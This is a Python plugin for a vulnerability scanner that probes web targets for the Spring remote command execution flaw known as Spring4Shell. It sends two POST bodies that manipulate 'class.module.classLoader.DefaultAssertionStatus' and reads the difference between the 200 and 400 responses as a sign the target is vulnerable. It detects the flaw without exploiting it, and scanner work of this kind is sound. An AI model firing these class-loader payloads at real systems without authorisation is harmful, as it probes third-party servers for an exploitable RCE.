#!/usr/bin/python
# coding=utf-8
'''
Date: 2022-04-01 15:44:40
LastEditors: recar
LastEditTime: 2022-04-01 15:55:15
'''


from plugins.poc.base import PocBase

class Poc(PocBase):
    def __init__(self):
        super(PocBase, self).__init__()
        self.name = "Spring 远程命令执行漏洞"
        self.cve = ""
        self.author = "Recar"
        self.desc = """Spring"""
        self.fingerprint = "spring"

    def verify(self):
        self.flag = self.gen_random_str()
        method = self.url_info.get('method')
        headers = self.url_info.get('headers')
        if method=="GET":
            return
        payload1 = """class.module.classLoader.DefaultAssertionStatus=False"""
        url = self.base_url
        self.logger.debug(url)
        response1 = self.request(url, method, data=payload1, headers=headers)
        payload2 = """class.module.classLoader.DefaultAssertionStatus=recar"""
        response2 = self.request(url, method, data=payload2, headers=headers)
        if response1.status_code == 200 and response2.status_code == 400:
            return True, url
        return False, None
